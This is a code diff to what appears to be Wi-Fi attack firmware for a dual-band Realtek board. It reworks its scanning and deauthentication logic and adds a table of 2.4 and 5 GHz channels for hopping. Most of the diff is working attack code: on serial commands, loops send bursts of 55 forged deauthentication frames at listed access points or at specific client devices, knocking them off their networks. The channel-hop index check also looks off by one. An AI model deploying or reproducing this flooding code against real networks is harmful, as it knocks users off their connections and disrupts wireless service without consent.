@@ -10,6 +10,8 @@
 LinkedList<BssidToDeauth>* bssid_to_deauth_list;
 LinkedList<BssidToDeauthWithStaion>* bssid_to_deauth_with_station_list;
 
+WiFiCallback wifiscan;
+
 void setup() {
     Serial.begin(115200);
     delay(100);
@@ -21,14 +23,16 @@ void setup() {
 }
 
 bool ap_scan = false;
-bool ap_sta_scan = false;
-bool broadcast_deauth_attack = false;
-bool sta_deauth_attack = false;
+bool deauthentication_attack = false;
+bool is_sta_deauth_attack = false;
 bool auth_attack = false;
 
 String ssid_to_probe_req = "";
-//uint8_t channel = 1;
 static uint16_t packet_sent = 0;
+
+#define DUAL_BAND_CHANNELS 38
+
+uint8_t dual_band_channels[DUAL_BAND_CHANNELS] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
 
 void loop() {
     String command = readMasterResponse();
@@ -40,10 +44,10 @@ void loop() {
             bssid_to_deauth_with_station_list->clear();
 
             ap_scan = false;
-            ap_sta_scan = false;
 
-            broadcast_deauth_attack = false;
-            sta_deauth_attack = false;
+            deauthentication_attack = false;
+            is_sta_deauth_attack = false;
+
             auth_attack = false;
 
             digitalWrite(LED_R, LOW);
@@ -56,26 +60,12 @@ void loop() {
         else if (command == "RTL_START_AP_SCAN") {
             digitalWrite(LED_G, HIGH);
             ap_scan = true;
-            band5ghz_scan = false;
-            //channel = 1;
-
-            //LwIP_Init();
-            wifi_on(RTW_MODE_STA);
-
-            wifi_enter_promisc_mode();
-            wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl_ap_sniffer_callback, 1);
+            wifiscan.start_rtl_ap_scan_callback(false);
         }
         else if (command == "RTL_START_AP_STA_SCAN") {
-            digitalWrite(LED_B, HIGH);
-            ap_sta_scan = true;
-            band5ghz_scan = false;
-            //channel = 1;
-
-            //LwIP_Init();
-            wifi_on(RTW_MODE_STA);
-
-            wifi_enter_promisc_mode();
-            wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl_ap_sta_sniffer_callback, 1);
+            digitalWrite(LED_G, HIGH);
+            ap_scan = true;
+            wifiscan.start_rtl_ap_scan_callback(true);
         }
         else if (command.startsWith("RTL_DEAUTH_STA")) {
             // RTL_DEAUTH_STA -am {<AP_MAC_ADDRESS>} -sm {<STA_MAC_ADDRESS>} -c <CHANNEL>
@@ -182,7 +172,8 @@ void loop() {
             }
             digitalWrite(LED_R, HIGH);
             wifi_on(RTW_MODE_AP);
-            sta_deauth_attack = true;
+            deauthentication_attack = true;
+            is_sta_deauth_attack = true;
         }
         else if (command.startsWith("RTL_DEAUTH")) {
             // RTL_DEAUTH -am {<MAC_ADDRESS>} -c {<CHANNEL>}
@@ -220,7 +211,7 @@ void loop() {
                 
                 digitalWrite(LED_R, HIGH);
                 wifi_on(RTW_MODE_AP);
-                broadcast_deauth_attack = true;
+                deauthentication_attack = true;
             }
         }
         /*
@@ -242,30 +233,38 @@ void loop() {
         */
     }
 
-    if (ap_scan || ap_sta_scan) {
-        channelHop();
-    }
-    else if (broadcast_deauth_attack) {
-        for (int i = 0; i < bssid_to_deauth_list->size(); i++) {
-            sendDualBandDeauthFrame(bssid_to_deauth_list->get(i).bssid, bssid_to_deauth_list->get(i).channel);
-            packet_sent = packet_sent + 6;
-            delay(1);
-        }
-        static unsigned long initTime = millis();
-        if (millis() - initTime > 1000) {
-            initTime = millis();
-            Serial.println("PACKET:" + String(packet_sent));
-            packet_sent = 0;
+    if (ap_scan) {
+        static uint32_t lastHop = 0;
+        static uint8_t dual_band_channel_index = 0;
+        if (millis() - lastHop >= 200) { // HOP_INTERVAL = 200 ms
+            wext_set_channel(WLAN0_NAME, dual_band_channels[dual_band_channel_index]);
+            
+            if (dual_band_channel_index >= DUAL_BAND_CHANNELS) {
+                dual_band_channel_index = 0;
+            } else {
+                dual_band_channel_index++;
+            }
+            lastHop = millis();
         }
     }
-    else if (sta_deauth_attack) {
-        for (int i = 0; i < bssid_to_deauth_with_station_list->size(); i++) {
-            BssidToDeauthWithStaion btdws = bssid_to_deauth_with_station_list->get(i);
-            for (int j = 0; j < btdws.stations->size(); j++) {
-                Station sta = btdws.stations->get(j);
-                sendDualBandDeauthFrame(btdws.bssid, btdws.channel, sta.mac);
-                packet_sent = packet_sent + 6;
-                delay(1);
+    else if (deauthentication_attack) {
+        if (!is_sta_deauth_attack) {
+            for (int i = 0; i < bssid_to_deauth_list->size(); i++) {
+                for (int k = 0; k < 55; k++) {
+                    sendDualBandDeauthFrame(bssid_to_deauth_list->get(i).bssid, bssid_to_deauth_list->get(i).channel);
+                    packet_sent = packet_sent + 6;
+                }
+            }
+        } else {
+            for (int i = 0; i < bssid_to_deauth_with_station_list->size(); i++) {
+                BssidToDeauthWithStaion btdws = bssid_to_deauth_with_station_list->get(i);
+                for (int j = 0; j < btdws.stations->size(); j++) {
+                    Station sta = btdws.stations->get(j);
+                    for (int k = 0; k < 55; k++) {
+                        sendDualBandDeauthFrame(btdws.bssid, btdws.channel, sta.mac);
+                        packet_sent = packet_sent + 12;
+                    }
+                }
             }
         }
         static unsigned long initTime = millis();
